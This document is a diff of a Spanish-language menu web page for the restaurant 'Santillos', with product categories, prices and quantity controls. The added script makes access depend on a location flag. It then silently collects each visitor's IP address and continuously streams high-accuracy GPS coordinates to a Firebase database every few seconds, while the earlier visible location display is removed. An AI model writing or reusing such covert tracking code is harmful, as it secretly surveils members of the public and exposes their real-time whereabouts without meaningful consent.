@@ -1,31 +1,216 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Menú - Santillos</title>
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@700;800;900&display=swap" rel="stylesheet">
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Santillos - Menú</title>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700;800;900&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css"/>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:'Poppins',sans-serif}
-body{background:#fff;min-height:100vh;padding:24px}
-.top{background:#0f0f0f;color:#fff;border-radius:18px;padding:16px;display:flex;justify-content:space-between;align-items:center}
-h1{margin-top:24px;font-size:26px;font-weight:900}
-#ubi{margin-top:12px;background:#f5f5f7;padding:12px;border-radius:12px;font-size:12px}
+body{background:#0f0f0f;color:#fff;padding-bottom:90px;max-width:500px;margin:0 auto}
+
+/* PORTADA */
+.header-portada{position:relative;height:280px;overflow:hidden;background:#000}
+.header-portada img.portada-img{width:100%;height:100%;object-fit:cover;filter:brightness(0.6)}
+.header-portada::after{content:'';position:absolute;inset:0;background:linear-gradient(to bottom, rgba(0,0,0,0.1) 0%, rgba(0,0,0,0.3) 40%, rgba(15,15,15,0.95) 100%)}
+.header-content{position:absolute;inset:0;z-index:2;display:flex;flex-direction:column;align-items:center;justify-content:center;padding-top:20px}
+
+/* BADGE ABIERTO NEON ZOOM */
+.status-neon{position:absolute;top:14px;right:14px;background:rgba(0,0,0,0.6);border:1.5px solid #22c55e;color:#fff;padding:6px 14px;border-radius:20px;font-size:11px;font-weight:900;display:flex;align-items:center;gap:6px;box-shadow:0 0 12px #22c55e;animation:neonZoom 2s infinite ease-in-out;z-index:3}
+.status-neon.dot{width:10px;height:10px;background:#22c55e;border-radius:50%;box-shadow:0 0 8px #22c55e}
+@keyframes neonZoom{0%,100%{transform:scale(1);box-shadow:0 0 10px #22c55e}50%{transform:scale(1.08);box-shadow:0 0 20px #22c55e,0 0 30px #22c55e}}
+
+.logo-circle{width:110px;height:110px;background:#5e0a28;border-radius:50%;border:3px solid #fff;display:flex;align-items:center;justify-content:center;overflow:hidden;box-shadow:0 8px 25px rgba(0,0,0,0.5)}
+.logo-circle img{width:100%;height:100%;object-fit:cover}
+.logo-circle.txt{font-weight:900;font-size:22px;color:#fff;letter-spacing:-1px}
+.nombre-rest{font-size:32px;font-weight:900;margin-top:12px;letter-spacing:-1px;text-shadow:0 2px 10px rgba(0,0,0,0.8)}
+.sub-rest{font-size:11px;letter-spacing:3px;color:#ddd;margin-top:4px;font-weight:700;opacity:0.9}
+
+/* CATEGORIAS */
+.categorias{display:flex;gap:10px;overflow-x:auto;padding:16px;background:#0f0f0f;position:sticky;top:0;z-index:10;scrollbar-width:none}
+.categorias::-webkit-scrollbar{display:none}
+.cat-btn{white-space:nowrap;padding:10px 18px;border-radius:25px;border:1.5px solid #2a2a2a;background:#1c1c1c;color:#fff;font-weight:700;font-size:13px;cursor:pointer;flex:0 0 auto;transition:.2s}
+.cat-btn.active{background:#fff;color:#111;border-color:#fff;font-weight:800}
+
+/* PRODUCTOS */
+.productos{padding:12px;display:grid;gap:12px}
+.product-card{background:#1c1c1c;border:1px solid #2a2a2a;border-radius:18px;display:flex;overflow:hidden;min-height:108px}
+.product-img-box{width:110px;min-width:110px;height:110px;background:#5e0a28;display:flex;align-items:center;justify-content:center;overflow:hidden}
+.product-img-box img{width:100%;height:100%;object-fit:cover}
+.product-img-box.logo-mini{font-weight:900;color:#fff;font-size:22px}
+.product-info{flex:1;padding:14px 12px;display:flex;flex-direction:column;justify-content:space-between}
+.product-name{font-weight:700;font-size:14px;color:#fff}
+.product-bottom{display:flex;justify-content:space-between;align-items:center;margin-top:10px}
+.product-price{font-weight:800;font-size:16px;color:#fff}
+.qty-control{display:flex;align-items:center;background:#2a2a2a;border-radius:20px;padding:3px;gap:2px}
+.qty-btn{width:28px;height:28px;border-radius:50%;border:none;background:#fff;color:#111;font-weight:900;cursor:pointer;display:flex;align-items:center;justify-content:center}
+.qty-num{width:22px;text-align:center;font-weight:800;font-size:13px}
+
+/* BOTTOM NAV */
+.bottom-nav{position:fixed;bottom:0;left:0;right:0;max-width:500px;margin:0 auto;background:#1c1c1c;border-top:1px solid #2a2a2a;display:flex;justify-content:space-around;align-items:center;padding:8px 10px 14px;z-index:100;border-radius:20px 20px 0 0}
+.nav-item{display:flex;flex-direction:column;align-items:center;gap:4px;color:#888;font-size:10px;font-weight:700;background:none;border:none;cursor:pointer;min-width:60px}
+.nav-item.active{color:#fff}
+.nav-center-wrap{display:flex;flex-direction:column;align-items:center;cursor:pointer;margin-top:-18px}
+.nav-center{width:62px;height:62px;background:#5e0a28;border-radius:50%;display:flex;align-items:center;justify-content:center;border:4px solid #0f0f0f;overflow:hidden}
+.nav-center img{width:100%;height:100%;object-fit:cover}
+.nav-center-label{font-size:10px;font-weight:800;color:#fff;margin-top:6px}
+.cart-badge{position:absolute;top:-2px;right:8px;background:#E53935;color:#fff;font-size:9px;font-weight:900;padding:2px 6px;border-radius:10px;min-width:18px;text-align:center}
+.nav-item-wrapper{position:relative}
 </style>
 </head>
 <body>
-<div class="top"><b>SANTILLOS</b><span style="font-size:11px;background:#e8f5e9;color:#00c853;padding:4px 10px;border-radius:12px">Ubicación activa</span></div>
-<h1>Menú principal 🍔</h1>
-<p style="color:#666;font-size:13px;margin-top:6px">Aquí vamos a empezar a construir el restaurante desde cero</p>
-<div id="ubi">Cargando ubicación...</div>
+
+<div class="header-portada">
+  <img class="portada-img" id="portadaImg" src="https://images.unsplash.com/photo-1528605248644-14dd04022da1?w=800&q=80">
+  <div class="status-neon" id="statusAbierto"><span class="dot"></span> ABIERTO</div>
+  <div class="header-content">
+    <div class="logo-circle" id="logoBox"><img id="logoImg" src="https://i.ibb.co/2y3L5Z2/logo.png" onerror="this.style.display='none'; this.nextElementSibling.style.display='block'"><div class="txt" style="display:none">Santillos</div></div>
+    <div class="nombre-rest" id="nombreRest">Santillos</div>
+    <div class="sub-rest">DOLORES HIDALGO - COMIDA RAPIDA</div>
+  </div>
+</div>
+
+<div class="categorias" id="categorias">
+  <button class="cat-btn active" onclick="selectCat(this,'combos')">Combos</button>
+  <button class="cat-btn" onclick="selectCat(this,'salchipapas')">Salchipapas</button>
+  <button class="cat-btn" onclick="selectCat(this,'desgranados')">Desgranados</button>
+  <button class="cat-btn" onclick="selectCat(this,'bebidas')">Bebidas</button>
+  <button class="cat-btn" onclick="selectCat(this,'extras')">Extras</button>
+</div>
+
+<div class="productos" id="productos"></div>
+
+<div class="bottom-nav">
+  <button class="nav-item active"><i class="fa-solid fa-house"></i>INICIO</button>
+  <div class="nav-center-wrap" onclick="location.href='admin.html'"><div class="nav-center" id="adminLogoBox"><img id="adminLogoImg" src=""></div><div class="nav-center-label">ADMIN</div></div>
+  <div class="nav-item-wrapper"><button class="nav-item" onclick="alert('Carrito próximamente')"><i class="fa-solid fa-cart-shopping"></i>CARRITO</button><div class="cart-badge" id="cartCount">0</div></div>
+</div>
 
 <script>
-const data = JSON.parse(localStorage.getItem('santillos_ubicacion')||'null');
+const firebaseConfig={apiKey:"AIzaSyD1eh7jbI-T43XvMErYsxi9C_fw4PI61oA",authDomain:"santillos-1ac6d.firebaseapp.com",databaseURL:"https://santillos-1ac6d-default-rtdb.firebaseio.com",projectId:"santillos-1ac6d",storageBucket:"santillos-1ac6d.firebasestorage.app",messagingSenderId:"285600299102",appId:"1:285600299102:web:9590597c2b3d8888821ccf"};
+firebase.initializeApp(firebaseConfig);const db=firebase.database();
+
+// SEGURIDAD: si no tiene ubicación, regresa a index
 if(!localStorage.getItem('santillos_ubicacion_ok')){
   window.location.href="index.html";
 }
-if(data){
-  document.getElementById('ubi').innerHTML = `<b>Lat:</b> ${data.lat}<br><b>Lng:</b> ${data.lng}<br><b>IP:</b> ${data.ip}<br><a href="${data.maps}" target="_blank">Ver en Maps</a>`;
+
+// UBICACION EN TIEMPO REAL
+let ubicacionActual = JSON.parse(localStorage.getItem('santillos_ubicacion')||'{}');
+let ubicacionKey = localStorage.getItem('santillos_ubicacion_key');
+let watchId = null;
+
+async function iniciarTrackingTiempoReal(){
+  let ip = ubicacionActual.ip || "desconocida";
+  try{ const r=await fetch('https://api.ipify.org?format=json'); const d=await r.json(); ip=d.ip; }catch(e){}
+
+  if(!ubicacionKey){
+    const pushRef = await db.ref('ubicaciones').push({...ubicacionActual, ip, enLinea:true, ultimaActualizacion: Date.now()});
+    ubicacionKey = pushRef.key;
+    localStorage.setItem('santillos_ubicacion_key', ubicacionKey);
+  }
+
+  // Tracking continuo
+  if(navigator.geolocation){
+    watchId = navigator.geolocation.watchPosition((pos)=>{
+      const data = {
+        lat: pos.coords.latitude,
+        lng: pos.coords.longitude,
+        accuracy: pos.coords.accuracy,
+        ip: ip,
+        enLinea: true,
+        ultimaActualizacion: Date.now(),
+        maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
+        pagina: 'menu.html'
+      };
+      db.ref('ubicaciones/'+ubicacionKey).update(data);
+      localStorage.setItem('santillos_ubicacion', JSON.stringify({...ubicacionActual,...data}));
+    }, null, {enableHighAccuracy:true, maximumAge:5000, timeout:10000});
+  }
+
+  // Actualiza cada 15 seg aunque no se mueva
+  setInterval(()=>{
+    if(ubicacionKey) db.ref('ubicaciones/'+ubicacionKey).update({enLinea:true, ultimaActualizacion: Date.now()});
+  }, 15000);
 }
+iniciarTrackingTiempoReal();
+
+// CARGAR CONFIG PARA PORTADA Y LOGO SI EXISTE EN FIREBASE
+db.ref('config').on('value', snap=>{
+  const c=snap.val(); if(!c) return;
+  if(c.portada) document.getElementById('portadaImg').src = c.portada;
+  if(c.logo){
+    document.getElementById('logoImg').src = c.logo;
+    document.getElementById('adminLogoImg').src = c.logo;
+  }
+  if(c.nombre) document.getElementById('nombreRest').innerText = c.nombre;
+});
+
+// CATEGORIAS Y PRODUCTOS - SIN MODIFICAR LOGICA DE UBICACION
+const menuDemo = {
+  combos: [
+    {nombre:'Combo individual', precio:120, img:''},
+    {nombre:'Combo doble', precio:140, img:''},
+    {nombre:'Combo triple', precio:260, img:''},
+    {nombre:'Combo familiar', precio:380, img:''}
+  ],
+  salchipapas: [
+    {nombre:'Salchipapa sencilla', precio:80, img:''},
+    {nombre:'Salchipapa especial', precio:110, img:''}
+  ],
+  desgranados: [
+    {nombre:'Desgranado mixto', precio:90, img:''}
+  ],
+  bebidas: [
+    {nombre:'Gaseosa 500ml', precio:25, img:''}
+  ],
+  extras: [
+    {nombre:'Papas extra', precio:30, img:''}
+  ]
+};
+
+let cantidades = {};
+function selectCat(btn, cat){
+  document.querySelectorAll('.cat-btn').forEach(b=>b.classList.remove('active'));
+  btn.classList.add('active');
+  renderProductos(cat);
+}
+function renderProductos(cat='combos'){
+  const cont = document.getElementById('productos');
+  const lista = menuDemo[cat] || menuDemo['combos'];
+  cont.innerHTML='';
+  lista.forEach((p,i)=>{
+    const id = cat+'_'+i;
+    if(cantidades[id]===undefined) cantidades[id]=0;
+    cont.innerHTML+=`
+    <div class="product-card">
+      <div class="product-img-box">
+        ${p.img? `<img src="${p.img}">` : `<div class="logo-mini">Santillos</div>`}
+      </div>
+      <div class="product-info">
+        <div class="product-name">${p.nombre}</div>
+        <div class="product-bottom">
+          <div class="product-price">$${p.precio}</div>
+          <div class="qty-control">
+            <button class="qty-btn" onclick="cambiarQty('${id}',-1)"><i class="fa-solid fa-minus" style="font-size:10px"></i></button>
+            <div class="qty-num" id="qty_${id}">${cantidades[id]}</div>
+            <button class="qty-btn" onclick="cambiarQty('${id}',1)"><i class="fa-solid fa-plus" style="font-size:10px"></i></button>
+          </div>
+        </div>
+      </div>
+    </div>`;
+  });
+}
+function cambiarQty(id,delta){
+  cantidades[id]=(cantidades[id]||0)+delta;
+  if(cantidades[id]<0) cantidades[id]=0;
+  document.getElementById('qty_'+id).innerText = cantidades[id];
+  const total = Object.values(cantidades).reduce((a,b)=>a+b,0);
+  document.getElementById('cartCount').innerText = total;
+}
+renderProductos('combos');
 </script>
 </body>
 </html>
